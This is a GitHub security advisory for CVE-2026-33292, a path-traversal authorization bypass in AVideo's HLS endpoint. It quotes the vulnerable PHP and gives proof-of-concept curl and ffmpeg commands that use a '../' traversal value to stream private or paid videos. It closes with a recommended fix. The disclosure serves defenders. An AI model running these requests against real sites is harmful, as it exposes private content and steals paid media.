# [H] AVideo has an Authorization Bypass via Path Traversal in HLS Endpoint Allows Streaming Private/Paid Videos

## Summary
Severity: High
Advisory: GHSA-pw4v-x838-w5pg
CVE: CVE-2026-33292
CWE: CWE-22
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-03-19
Source: https://github.com/advisories/GHSA-pw4v-x838-w5pg
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary

The HLS streaming endpoint (`view/hls.php`) is vulnerable to a path traversal attack that allows an unauthenticated attacker to stream any private or paid video on the platform. The `videoDirectory` GET parameter is used in two divergent code paths — one for authorization (which truncates at the first `/` segment) and one for file access (which preserves `..` traversal sequences) — creating a split-oracle condition where authorization is checked against one video while content is served from another.

## Details

The vulnerability is a split-oracle between the authorization lookup and the filesystem path construction. When `hls.php` receives a request, it processes `$_GET['videoDirectory']` through two independent functions that interpret the input differently.

**Step 1 — Authorization lookup truncates at first path segment** (`objects/video.php:1685-1688`):

```php
public static function getVideoFromFileName($fileName, $ignoreGroup = false, $ignoreTags = false)
{
    // ...
    $parts = explode("/", $fileName);
    if (!empty($parts[0])) {
        $fileName = $parts[0];  // Only takes first segment
    }
    $fileName = self::getCleanFilenameFromFile($fileName);
    // ...
    $sql = "SELECT id FROM videos WHERE filename = ? LIMIT 1";
    $res = sqlDAL::readSql($sql, "s", [$fileName]);
```

For input `public_video/../private_video`, `explode("/", ...)` yields `["public_video", "..", "private_video"]` and only `public_video` is used for the DB query. The authorization check at `hls.php:73` then runs against this public video:

```php
if (isAVideoUserAgent() || ... || User::canWatchVideo($video['id']) || ...) {
```

**Step 2 — File path construction preserves the traversal** (`objects/video.php:4622-4638`):

```php
public static function getPathToFile($videoFilename, $createDir = false)
{
    $videosDir = self::getStoragePath();
    $videoFilename = str_replace($videosDir, '', $videoFilename);
    $paths = Video::getPaths($videoFilename, $createDir);
    if (preg_match('/index(_offline)?.(m3u8|mp4|mp3)$/', $videoFilename)) {
        $paths['path'] = rtrim($paths['path'], DIRECTORY_SEPARATOR);
        $paths['path'] = rtrim($paths['path'], '/');
        $videoFilename = str_replace($paths['relative'], '', $videoFilename);
        $videoFilename = str_replace($paths['filename'], '', $videoFilename);
    }
    $newPath = addLastSlash($paths['path']) . "{$videoFilename}";
    $newPath = str_replace('//', '/', $newPath);
    return $newPath;
}
```

`getPaths` extracts the clean filename (e.g., `public_video`) to build the base path `/videos/public_video/`. Then `str_replace($paths['filename'], '', $videoFilename)` replaces only the clean name from the full input, leaving the traversal intact: `/../private_video/index.m3u8`. The concatenation at line 4634 produces `/videos/public_video/../private_video/index.m3u8`, which the OS resolves to `/videos/private_video/index.m3u8`.

**No mitigations exist in the path:**
- `fixPath()` (`objects/functionsFile.php:1116`) only normalizes slashes, does not filter `..`
- No `realpath()` call anywhere in the chain
- No `..` filtering on the `videoDirectory` parameter
- The traversal is in a query parameter, not the URL path, so web server path normalization does not apply

## PoC

**Prerequisites:** An AVideo instance with at least one public video (filename: `public_video`) and one private/paid video (filename: `private_video`).

**Step 1 — Confirm the private video is inaccessible directly:**

```bash
curl -s "https://target.com/view/hls.php?videoDirectory=private_video" \
  | head -5
# Expected: "HLS.php Can not see video [ID] (private_video) cannot watch (ID)"
```

**Step 2 — Exploit the split-oracle to stream the private video:**

```bash
curl -s "https://target.com/view/hls.php?videoDirectory=public_video/../private_video" \
  -H "Accept: application/vnd.apple.mpegurl"
# Expected: Valid M3U8 playlist containing private_video's HLS segments
```

**Step 3 — Stream the private video content using the returned playlist:**

```bash
# The M3U8 response contains segment URLs; use ffmpeg or any HLS player:
ffmpeg -i "https://target.com/view/hls.php?videoDirectory=public_video/../private_video" \
  -c copy stolen_video.mp4
```

The authorization check passes because it resolves `public_video` (the public video), while the file system serves `private_video`'s HLS stream.

## Impact

- **Any unauthenticated user** can stream any private, unlisted, or paid video on the platform by knowing or guessing its filename directory.
- **Paid content bypass:** Monetized videos protected by pay-per-view or subscription gates can be streamed for free.
- **Privacy violation:** Videos marked as private or restricted to specific user groups are fully accessible.
- **Content theft at scale:** Video filenames follow predictable patterns (e.g., `video_YYYYMMDD_XXXXX`), enabling enumeration. An attacker only needs one publicly accessible video to pivot to any other video on the instance.
- This affects all AVideo instances with at least one public video, which is the default configuration for any content platform.

## Recommended Fix

Sanitize the `videoDirectory` parameter to reject path traversal sequences before any processing occurs. Apply this fix at the top of `view/hls.php`:

```php
// view/hls.php — after line 16, before line 17
if (empty($_GET['videoDirectory'])) {
    forbiddenPage("No directory set");
}

// ADD: Reject path traversal attempts
$_GET['videoDirectory'] = str_replace('\\', '/', $_GET['videoDirectory']);
if (preg_match('/\.\./', $_GET['videoDirectory'])) {
    forbiddenPage("Invalid directory");
}
// Normalize: strip leading/trailing slashes, collapse multiples
$_GET['videoDirectory'] = trim($_GET['videoDirectory'], '/');
$_GET['videoDirectory'] = preg_replace('#/+#', '/', $_GET['videoDirectory']);
```

Additionally, add a `realpath()` check in `getPathToFile` as defense-in-depth (`objects/video.php:4636`):

```php
$newPath = str_replace('//', '/', $newPath);
// ADD: Verify resolved path stays within videos directory
$realPath = realpath($newPath);
$realVideosDir = realpath($videosDir);
if ($realPath === false || strpos($realPath, $realVideosDir) !== 0) {
    return false;
}
return $newPath;
```

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-pw4v-x838-w5pg
- https://nvd.nist.gov/vuln/detail/CVE-2026-33292
- https://github.com/WWBN/AVideo/commit/bc034066281085af00e64b0d7b81d8a025a928c4
- https://github.com/WWBN/AVideo
